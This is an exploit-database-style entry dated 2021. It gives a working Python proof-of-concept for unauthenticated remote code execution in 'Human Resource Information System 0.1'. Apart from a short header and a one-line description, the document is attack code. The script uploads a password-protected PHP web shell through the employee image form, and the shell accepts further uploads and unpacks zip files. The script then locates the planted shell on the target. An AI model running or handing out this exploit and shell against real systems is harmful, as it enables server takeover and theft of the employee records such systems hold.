# Exploit Title: Human Resource Information System 0.1 - Remote Code Execution (Unauthenticated)
# Date: 04-05-2021
# Exploit Author: Reza Afsahi
# Vendor Homepage: https://www.sourcecodester.com
# Software Link: https://www.sourcecodester.com/php/14714/human-resource-information-using-phpmysqliobject-orientedcomplete-free-sourcecode.html
# Software Download: https://www.sourcecodester.com/download-code?nid=14714&title=Human+Resource+Information+System+Using+PHP+with+Source+Code
# Version: 0.1
# Tested on: PHP 7.4.11 , Linux x64_x86

############################################################################################################

# Description:
# The web application allows for an unauthenticated file upload which can result in a Remote Code Execution.

############################################################################################################

# Proof of concept:

#!/usr/bin/python3
# -*- coding: utf-8 -*-
import requests
import sys
from bs4 import BeautifulSoup

def find_shell(domain):
    req_2 = requests.get(domain + "/Admin_Dashboard/Add_employee.php")
    soup = BeautifulSoup(req_2.content , "html.parser")
    imgs = soup.find_all("img")
    for i in imgs:
        src = i['src']
        if ("shell.php" in src):
            print(" [!] Your shell is ready :) ==> " + domain + "/Admin_Dashboard/" + src + "\n")
            break
        else:
            continue

def upload_file(domain):

    print("\n [!] Uploading Shell . . .")
    payload =  """ 
    <?php

$password = "123"; // Password 

session_start();
error_reporting(0);
set_time_limit(0);
ini_set("memory_limit",-1);


$sessioncode = md5(__FILE__);
if(!empty($password) and $_SESSION[$sessioncode] != $password){
    # _REQUEST mean _POST or _GET 
    if (isset($_REQUEST['pass']) and $_REQUEST['pass'] == $password) {
        $_SESSION[$sessioncode] = $password;
    }
    else {
        print "<pre align=center><font>
	
 _  ____                    _                 
(_)/ ___|___  _ __ ___  ___(_)_   _ _ __ ___  
| | |   / _ \| '_ ` _ \/ __| | | | | '_ ` _ \ 
| | |__| (_) | | | | | \__ \ | |_| | | | | | |
|_|\____\___/|_| |_| |_|___/_|\__,_|_| |_| |_|
                                              
</font><font>https://spyhackerz.org/forum/members/icomsium.58799/</font><form method=post>Password: <input type='password' name='pass'><input type='submit' value='>>'></form> <br><img src=https://hackerhaberleri.files.wordpress.com/2016/04/3l6ol0.png></img><br></pre>";
        exit;        
    }

}

echo '<font face="Comic Sans MS" </font><b>[♥] Dosya Yükle [♥]<br><br><font face="Comic Sans MS" <br>- iComsium -</b></font>';
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
$file = $_FILES['file']['name'];
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
$zip = new ZipArchive;
if ($zip->open($file) === TRUE) {
    $zip->extractTo('./');
    $zip->close();
echo 'Yükleme Ba?ar?l?';
} else {
echo '[ + ] Upload Sucess [ + ]';
}    
}else{ 
echo '<b>[ - ] No Upload [ - ]</b><br><br>'; 
}
}
?>
    """
    
    h = {
        "Content-Type" : "multipart/form-data"
    }

    f = {'employee_image':('shell.php',payload,
                    'application/x-php', {'Content-Disposition': 'form-data'}
              )
    }
    d = {
        "emplo"              : "",
        "employee_companyid" : "test",
        "employee_firstname" : "test",
        "employee_lastname"  : "test",
        "employee_middlename" : "test",
        "branches_datefrom"  : "0011-11-11",
        "branches_recentdate" : "2222-11-11",
        "employee_position"  : "test",
        "employee_contact"   : "23123132132",
        "employee_sss"       : "test",
        "employee_tin"       : "test",
        "employee_hdmf_pagibig" : "test",
        "employee_gsis"      : "test"
    }
    url = domain + "/Admin_Dashboard/process/addemployee_process.php"
    req = requests.post(url , data=d , files = f)
    if req.status_code == 200:
        if ("Insert Successfully" in req.text):
            print("\n [!] Shell uploaded succefully\n")
            find_shell(domain)

    else:
        print("Exploiting Failed")

def main():
    if len(sys.argv) != 2:
        print('[!] usage: %s <target url> ' % sys.argv[0])
        print('[!] eg: %s http://vulndomain.com' % sys.argv[0])
        sys.exit(-1)

    print("<><><><><><><><><><><><><><><><><><><><><><><><>")
    print("<>      Human Resource Information System     <>")
    print("<>               Shell Uploader               <>")
    print("<><><><><><><><><><><><><><><><><><><><><><><><>")
    target_domain = sys.argv[1]
    upload_file(target_domain)

if __name__ == "__main__":
  main()